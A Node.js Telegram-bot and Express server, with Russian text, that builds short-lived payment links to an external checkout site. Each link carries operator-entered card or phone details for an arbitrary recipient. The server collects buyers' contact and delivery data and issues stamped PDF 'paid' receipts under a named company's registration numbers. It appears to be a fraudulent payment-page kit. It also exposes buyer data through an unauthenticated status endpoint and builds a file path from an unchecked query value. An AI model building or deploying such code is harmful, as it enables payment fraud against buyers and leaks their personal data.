require("dotenv").config();

const express = require("express");
const multer = require("multer");
const cors = require("cors");
const { Telegraf, Markup } = require("telegraf");
const PDFDocument = require("pdfkit");
const fs = require("fs");
const path = require("path");

const BOT_TOKEN = process.env.BOT_TOKEN;
const TG_CHAT_ID = process.env.TG_CHAT_ID;
const BASE_PAYMENT_URL = process.env.BASE_PAYMENT_URL || "https://warepointpay.ru";
const APP_BASE_URL = process.env.APP_BASE_URL || "https://warepoint-pay-bot.onrender.com";
const PORT = Number(process.env.PORT || 3000);
const CHECKOUT_FOLDER = "/checkout/";

if (!BOT_TOKEN) {
  console.error("❌ Нет BOT_TOKEN!");
  process.exit(1);
}

const bot = new Telegraf(BOT_TOKEN);
const app = express();

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const upload = multer({ storage: multer.memoryStorage() });

const sessions = new Map();
const orders = new Map();
const lastOrders = new Map();

const RECEIPTS_DIR = path.join(__dirname, "receipts");
if (!fs.existsSync(RECEIPTS_DIR)) {
  fs.mkdirSync(RECEIPTS_DIR, { recursive: true });
}

const FONT_REGULAR = path.join(__dirname, "DejaVuSans.ttf");
const FONT_BOLD = path.join(__dirname, "DejaVuSans-Bold.ttf");
const STAMP_PATH = path.join(__dirname, "stamp.png");

// ============ ФУНКЦИИ ============
function normalizeDigits(value) {
  return String(value || "").replace(/\D/g, "");
}

function formatAmount(val) {
  return Number(val || 0).toLocaleString("ru-RU") + " ₽";
}

function formatAmountPdf(value) {
  const num = String(value || "").replace(/[^\d]/g, "");
  if (!num) return "0,00 ₽";
  return Number(num).toLocaleString("ru-RU") + ",00 ₽";
}

function formatCard(value) {
  const digits = normalizeDigits(value);
  if (digits.length >= 16) {
    return digits.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
  }
  return value;
}

function formatPhone(value) {
  let digits = normalizeDigits(value);
  if (digits.length === 11) {
    if (digits.startsWith("8")) digits = "7" + digits.slice(1);
    if (!digits.startsWith("7")) digits = "7" + digits;
  }
  if (digits.length === 11) {
    return `+7 (${digits.slice(1, 4)}) ${digits.slice(4, 7)}-${digits.slice(7, 9)}-${digits.slice(9, 11)}`;
  }
  return value;
}

function isValidCard(value) {
  const digits = normalizeDigits(value);
  return digits.length >= 15 && digits.length <= 19;
}

function isValidPhone(value) {
  const digits = normalizeDigits(value);
  return digits.length === 11;
}

function getLast4(value) {
  return String(value || "").replace(/[^\d]/g, "").slice(-4);
}

function getDateTime() {
  return new Date().toLocaleString("ru-RU", { timeZone: "Europe/Moscow" });
}

// ============ КРАСИВЫЙ PDF ============
function generateConfirmationPdfBuffer(meta) {
  return new Promise((resolve, reject) => {
    try {
      const doc = new PDFDocument({ size: "A4", margin: 25 });
      const chunks = [];
      
      doc.on("data", (chunk) => chunks.push(chunk));
      doc.on("end", () => resolve(Buffer.concat(chunks)));
      doc.on("error", reject);

      doc.registerFont("regular", FONT_REGULAR);
      doc.registerFont("bold", FONT_BOLD);

      const pageWidth = doc.page.width;
      const left = 25;
      const right = pageWidth - 25;

      const dateTime = getDateTime();
      const order = String(meta.order || "—");
      const product = String(meta.product || "Товар");
      const amount = formatAmountPdf(meta.amount || "0");
      const methodName = meta.method === "phone" ? "По номеру телефона" : "На карту";
      const requisiteLabel = meta.method === "phone" ? "Номер телефона" : "Номер карты";
      const requisite = meta.requisite || "—";
      const bank = meta.bank || "—";
      const recipient = meta.recipient || "—";

      let y = 20;

      // Верхняя линия
      doc.moveTo(left, y).lineTo(right, y).stroke("#1d4f91");
      y += 15;

      // Название компании
      doc.font("bold").fontSize(16).fillColor("#1d4f91");
      doc.text('ООО "БЕТОН"', left, y, { align: "center" });
      
      y += 25;
      doc.font("regular").fontSize(8).fillColor("#666");
      doc.text("ИНН 9726099596  •  ОГРН 1257700249157  •  КПП 772601001", left, y, { align: "center" });
      
      y += 20;
      doc.moveTo(left, y).lineTo(right, y).stroke("#e5e7eb");
      
      y += 15;
      doc.font("bold").fontSize(18).fillColor("#1d4f91");
      doc.text("ЧЕК ОПЛАТЫ", left, y, { align: "center" });
      
      y += 25;
      doc.font("regular").fontSize(10).fillColor("#666");
      doc.text(dateTime, left, y, { align: "center" });
      doc.text(`Заказ №${order}`, left, y + 15, { align: "center" });

      y += 45;
      doc.moveTo(left, y).lineTo(right, y).stroke("#2563eb");
      y += 20;

      // Товар
      doc.font("bold").fontSize(14).fillColor("#1d4f91");
      doc.text("ТОВАР:", left, y);
      y += 8;
      doc.font("bold").fontSize(16).fillColor("#000");
      doc.text(product, left, y);
      
      y += 8;
      doc.font("regular").fontSize(11).fillColor("#666");
      doc.text("Количество: 1 шт.", left, y);

      y += 30;

      // Сумма
      doc.font("bold").fontSize(28).fillColor("#16a34a");
      doc.text(amount, left, y, { align: "right" });
      
      y += 40;

      // Разделитель
      doc.font("regular").fontSize(8).fillColor("#999");
      doc.text("•  •  •  •  •  •  •  •  •  •  •  •  •  •  •  •  •  •  •  •  •  •  •  •  •  •  •  •  •  •", left, y, { align: "center" });
      
      y += 25;

      // Реквизиты
      doc.font("bold").fontSize(12).fillColor("#1d4f91");
      doc.text("РЕКВИЗИТЫ ДЛЯ ОПЛАТЫ:", left, y);
      y += 20;

      doc.font("regular").fontSize(11).fillColor("#000");
      doc.text(`Способ оплаты:`, left, y);
      doc.font("bold").fontSize(11).fillColor("#1d4f91");
      doc.text(methodName, left + 130, y);
      
      y += 18;

      doc.font("regular").fontSize(11).fillColor("#000");
      doc.text(`${requisiteLabel}:`, left, y);
      doc.font("bold").fontSize(11).fillColor("#000");
      doc.text(requisite, left + 130, y);
      
      y += 18;

      doc.font("regular").fontSize(11).fillColor("#000");
      doc.text("Банк:", left, y);
      doc.font("bold").fontSize(11).fillColor("#000");
      doc.text(bank, left + 130, y);
      
      y += 18;

      doc.font("regular").fontSize(11).fillColor("#000");
      doc.text("Получатель:", left, y);
      doc.font("bold").fontSize(11).fillColor("#000");
      doc.text(recipient, left + 130, y);

      y += 35;

      // Разделитель
      doc.font("regular").fontSize(8).fillColor("#999");
      doc.text("•  •  •  •  •  •  •  •  •  •  •  •  •  •  •  •  •  •  •  •  •  •  •  •  •  •  •  •  •  •", left, y, { align: "center" });
      
      y += 25;

      // Статус
      doc.font("bold").fontSize(14).fillColor("#16a34a");
      doc.text("✅ ОПЛАЧЕНО", left, y, { align: "center" });
      
      y += 30;

      // Итого
      doc.font("bold").fontSize(14).fillColor("#000");
      doc.text(`ИТОГО: ${amount}`, left, y, { align: "right" });
      
      y += 15;
      doc.font("regular").fontSize(9).fillColor("#999");
      doc.text("Без НДС", left, y, { align: "right" });

      y += 40;

      // Нижняя линия
      doc.moveTo(left, y).lineTo(right, y).stroke("#e5e7eb");
      y += 15;

      // Печать и подпись
      if (fs.existsSync(STAMP_PATH)) {
        try {
          doc.font("regular").fontSize(8).fillColor("#999");
          doc.text("_________________________", left + 20, y + 30);
          doc.text("Подпись / М.П.", left + 20, y + 45);
          
          const stampSize = 120;
          doc.save();
          doc.opacity(0.85);
          doc.rotate(-15, {
            origin: [right - 70, y + stampSize / 2]
          });
          doc.image(STAMP_PATH, right - 130, y, {
            fit: [stampSize, stampSize]
          });
          doc.restore();
        } catch (e) {
          console.error("Ошибка печати:", e);
        }
      }

      y += 150;

      // Подвал
      doc.font("regular").fontSize(7).fillColor("#999");
      doc.text('ООО "БЕТОН" • ИНН 9726099596 • ОГРН 1257700249157 • КПП 772601001', left, y, { align: "center" });
      y += 12;
      doc.text("Чек сформирован автоматически", left, y, { align: "center" });

      doc.end();
    } catch (err) {
      reject(err);
    }
  });
}

// ============ МЕНЮ ============
async function setupMenu() {
  try {
    await bot.telegram.setMyCommands([
      { command: "new", description: "💳 Новый платеж" },
      { command: "links", description: "📋 Мои ссылки" },
      { command: "repeat", description: "🔄 Повторить" },
      { command: "cancel", description: "❌ Отмена" }
    ]);
  } catch (e) {
    console.error("Ошибка меню:", e.message);
  }
}

const MAIN_MENU = [
  ["💳 Новый платеж"],
  ["📋 Мои ссылки"],
  ["🔄 Повторить"],
  ["❌ Отмена"]
];

function showMainMenu(ctx) {
  return ctx.reply("👇 Выберите действие:", Markup.keyboard(MAIN_MENU).resize());
}

function buildPaymentUrl(data) {
  const params = new URLSearchParams();
  
  params.set("order", data.order || "");
  params.set("product", data.product || "");
  params.set("amount", data.amount || "");
  params.set("method", data.method || "card");
  params.set("bank", data.bank || "");
  params.set("recipient", data.recipient || "");
  params.set("requisite", data.requisite || "");

  if (data.method === "card") {
    params.set("card", data.requisite || "");
    params.set("phone_pay", "");
  } else {
    params.set("phone_pay", data.requisite || "");
    params.set("card", "");
  }

  const expires = Date.now() + 15 * 60 * 1000;
  params.set("expires", String(expires));

  const url = `${BASE_PAYMENT_URL}${CHECKOUT_FOLDER}?${params.toString()}`;
  
  console.log("🔗 URL оформления:", url);
  console.log("📱 requisition:", data.requisite);
  
  const orderId = data.order || Math.random().toString(36).substring(2, 8);
  orders.set(orderId, { ...data, id: orderId, status: "pending", createdAt: Date.now() });

  return url;
}

// ============ БОТ ============
bot.catch((err, ctx) => {
  console.error("Ошибка бота:", err.message);
});

bot.start(async (ctx) => {
  await ctx.reply("🚀 Бот для создания платёжных ссылок");
  await showMainMenu(ctx);
});

bot.command("new", async (ctx) => {
  sessions.set(ctx.from.id, { step: "order", data: {} });
  await ctx.reply("📦 Введите номер заказа:");
});

bot.hears("💳 Новый платеж", async (ctx) => {
  sessions.set(ctx.from.id, { step: "order", data: {} });
  await ctx.reply("📦 Введите номер заказа:");
});

bot.hears("📋 Мои ссылки", async (ctx) => {
  let msg = "📋 Последние заказы:\n\n";
  let count = 0;
  
  orders.forEach((order) => {
    if (count >= 5) return;
    const statusEmoji = order.status === "approved" ? "✅" : order.status === "rejected" ? "❌" : "⏳";
    msg += `${statusEmoji} Заказ: ${order.order} | ${formatAmount(order.amount)}\n`;
    count++;
  });

  if (count === 0) msg = "Нет созданных заказов.";
  await ctx.reply(msg);
});

bot.hears("🔄 Повторить", async (ctx) => {
  const last = lastOrders.get(ctx.from.id);
  if (!last) return ctx.reply("Нет последнего заказа.");
  
  const url = buildPaymentUrl({ ...last, userId: ctx.from.id });
  await ctx.reply(`🔄 Повтор:\n📦 ${last.order}\n💰 ${formatAmount(last.amount)}\n🔗 ${url}`);
});

bot.hears("❌ Отмена", async (ctx) => {
  sessions.delete(ctx.from.id);
  await ctx.reply("❌ Отменено.");
});

bot.on("text", async (ctx) => {
  const session = sessions.get(ctx.from.id);
  if (!session) return;

  const text = ctx.message.text;

  try {
    switch (session.step) {
      case "order":
        session.data.order = text;
        session.step = "product";
        await ctx.reply("🛍 Товар:");
        break;

      case "product":
        session.data.product = text;
        session.step = "amount";
        await ctx.reply("💰 Сумма (только цифры):");
        break;

      case "amount":
        const amt = normalizeDigits(text);
        if (!amt) return ctx.reply("❌ Только цифры!");
        session.data.amount = amt;
        session.step = "method";
        await ctx.reply("💳 Выберите способ:", 
          Markup.keyboard([["💳 По карте", "📱 По номеру телефона"]]).resize()
        );
        break;

      case "method":
        if (text.includes("карт")) {
          session.data.method = "card";
          await ctx.reply("💳 Номер карты:", Markup.removeKeyboard());
        } else if (text.includes("телефон") || text.includes("номер")) {
          session.data.method = "phone";
          await ctx.reply("📱 Номер телефона:", Markup.removeKeyboard());
        } else {
          return ctx.reply("⚠️ Выберите:", 
            Markup.keyboard([["💳 По карте", "📱 По номеру телефона"]]).resize()
          );
        }
        session.step = "requisite";
        break;

      case "requisite":
        if (session.data.method === "card") {
          if (!isValidCard(text)) return ctx.reply("❌ 15-19 цифр!");
          session.data.requisite = formatCard(text);
        } else {
          if (!isValidPhone(text)) return ctx.reply("❌ 11 цифр!");
          session.data.requisite = formatPhone(text);
        }
        session.step = "bank";
        await ctx.reply("🏦 Банк:");
        break;

      case "bank":
        session.data.bank = text;
        session.step = "recipient";
        await ctx.reply("👤 Получатель:");
        break;

      case "recipient":
        session.data.recipient = text;
        session.data.userId = ctx.from.id;
        
        const url = buildPaymentUrl(session.data);
        lastOrders.set(ctx.from.id, { ...session.data });
        
        const methodEmoji = session.data.method === "card" ? "💳" : "📱";
        const reqLabel = session.data.method === "card" ? "Карта" : "Телефон";
        
        await ctx.reply(
          `✅ Готово!\n\n` +
          `📦 Заказ: ${session.data.order}\n` +
          `🛍 Товар: ${session.data.product}\n` +
          `💰 Сумма: ${formatAmount(session.data.amount)}\n` +
          `${methodEmoji} ${reqLabel}: ${session.data.requisite}\n` +
          `🏦 Банк: ${session.data.bank}\n` +
          `👤 Получатель: ${session.data.recipient}\n\n` +
          `🔗 ${url}`
        );
        
        sessions.delete(ctx.from.id);
        await showMainMenu(ctx);
        break;
    }
  } catch (err) {
    console.error("Ошибка:", err);
    sessions.delete(ctx.from.id);
    ctx.reply("❌ Ошибка. /new — начать заново");
  }
});

// ============ API ============
app.get("/status", (req, res) => {
  const order = orders.get(req.query.order);
  if (!order) return res.json({ ok: false });
  res.json({ ok: true, status: order.status, data: order });
});

app.get("/receipt", (req, res) => {
  const orderId = req.query.order;
  const filePath = path.join(RECEIPTS_DIR, `receipt_${orderId}.pdf`);
  
  if (!fs.existsSync(filePath)) {
    return res.status(404).send("Чек не найден");
  }
  
  res.sendFile(filePath);
});

app.post("/send", upload.single("file"), async (req, res) => {
  try {
    const orderId = req.body.order;
    const order = orders.get(orderId);

    if (!order) {
      return res.json({ ok: false, error: "Заказ не найден" });
    }

    order.customer_name = req.body.customer_name || "";
    order.customer_phone = req.body.customer_phone || "";
    order.customer_email = req.body.customer_email || "";
    order.delivery = req.body.delivery || "";
    order.city = req.body.city || "";
    order.full_address = req.body.full_address || "";
    order.pickup = req.body.pickup || "";
    order.comment = req.body.comment || "";
    order.status = "checking";

    const methodEmoji = order.method === "phone" ? "📱" : "💳";
    const methodName = order.method === "phone" ? "По номеру телефона" : "На карту";
    const cardMask = order.method === "card" ? `***** ${getLast4(order.requisite)}` : order.requisite;

    let message = `💸 Новое подтверждение оплаты\n\n`;
    message += `📦 Заказ: ${order.order}\n`;
    message += `🛍 Товар: ${order.product}\n`;
    message += `💰 Сумма: ${formatAmount(order.amount)}\n`;
    message += `👤 Получатель: ${order.recipient}\n`;
    message += `🏦 Банк: ${order.bank}\n`;
    message += `${methodEmoji} ${methodName}: ${cardMask}\n`;
    
    if (order.comment) {
      message += `\n💬 Комментарий: ${order.comment}\n`;
    }
    
    message += `\n📌 Статус: Ожидает проверки`;

    if (TG_CHAT_ID) {
      await bot.telegram.sendMessage(TG_CHAT_ID, message, {
        ...Markup.inlineKeyboard([
          [
            Markup.button.callback("✅ Подтвердить", `approve_${orderId}`),
            Markup.button.callback("❌ Отклонить", `reject_${orderId}`)
          ]
        ])
      });

      if (req.file && req.file.buffer && req.file.size > 0) {
        await bot.telegram.sendDocument(TG_CHAT_ID, {
          source: req.file.buffer,
          filename: req.file.originalname
        });
      }
    }

    res.json({ ok: true });
  } catch (e) {
    console.error("Ошибка send:", e);
    res.json({ ok: false, error: e.message });
  }
});

// ============ КНОПКИ ============
bot.action(/approve_(.+)/, async (ctx) => {
  const orderId = ctx.match[1];
  const order = orders.get(orderId);

  if (!order) {
    return ctx.answerCbQuery("Заказ не найден");
  }

  order.status = "approved";

  try {
    const pdfBuffer = await generateConfirmationPdfBuffer(order);
    const pdfPath = path.join(RECEIPTS_DIR, `receipt_${orderId}.pdf`);
    fs.writeFileSync(pdfPath, pdfBuffer);

    const receiptUrl = `${APP_BASE_URL}/receipt?order=${orderId}`;

    const oldText = ctx.callbackQuery.message.text || "";
    const newText = oldText.replace("Ожидает проверки", "Оплата подтверждена ✅");

    await ctx.editMessageText(newText);

    await ctx.reply(
      `✅ Оплата подтверждена!\n\n📦 Заказ: #${orderId}\n🔗 Чек: ${receiptUrl}`
    );

    await ctx.replyWithDocument({
      source: pdfBuffer,
      filename: `Подтверждение_оплаты_заказ_${orderId}.pdf`
    });

    return ctx.answerCbQuery("Подтверждено!");
  } catch (err) {
    console.error("Ошибка PDF:", err);
    return ctx.answerCbQuery("Ошибка создания PDF");
  }
});

bot.action(/reject_(.+)/, async (ctx) => {
  const orderId = ctx.match[1];
  const order = orders.get(orderId);

  if (!order) {
    return ctx.answerCbQuery("Заказ не найден");
  }

  order.status = "rejected";

  const oldText = ctx.callbackQuery.message.text || "";
  const newText = oldText.replace("Ожидает проверки", "Оплата отклонена ❌");

  await ctx.editMessageText(newText);

  return ctx.answerCbQuery("Отклонено!");
});

// ============ ЗАПУСК ============
app.post("/bot", bot.webhookCallback("/bot"));

app.listen(PORT, async () => {
  await setupMenu();
  await bot.telegram.deleteWebhook();
  await bot.telegram.setWebhook(`${APP_BASE_URL}/bot`);
  console.log("✅ Бот и API запущены на порту", PORT);
  console.log("🔗 Ссылки ведут на:", `${BASE_PAYMENT_URL}${CHECKOUT_FOLDER}`);
});
